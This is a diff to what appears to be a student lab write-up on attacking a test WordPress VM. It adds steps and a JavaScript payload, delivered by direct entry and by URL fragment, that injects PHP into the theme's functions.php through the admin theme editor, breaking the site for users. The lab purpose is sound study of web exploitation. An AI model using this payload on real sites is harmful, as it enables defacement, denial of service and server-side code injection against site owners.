@@ -47,10 +47,16 @@ In this exploit, I launched a user enumeration attack on WPDistillery.vm
      - An alert box should pop up, showing (1)
      ![image](https://user-images.githubusercontent.com/111927957/198874401-26b38a41-6bc0-444d-a1bb-e3b1a6b4c81b.png)
      
-   2.
+   2. Go to theme editor > file functions.php
+   3. Insert the following code to break the page:
+   -nc=document.querySelector('#newcontent');nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;nc.form.submit.click()
+   
+   4. Refresh the page the add this to the end of the URL:
+   #i=document.createElement('iframe');document.body.appendChild(i);i.src='/wp-admin/theme-editor.php?      file=functions.php';window.setTimeout(function(){nc=i.contentDocument.querySelector('#newcontent');nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;nc.form.submit.click()},3000)
+  
+   5. Users now won't have access to any access to the website.
 
-
-
+![image](https://user-images.githubusercontent.com/111927957/198875062-37c59997-b311-4f63-a008-697fabf3d330.png)
 
   
   
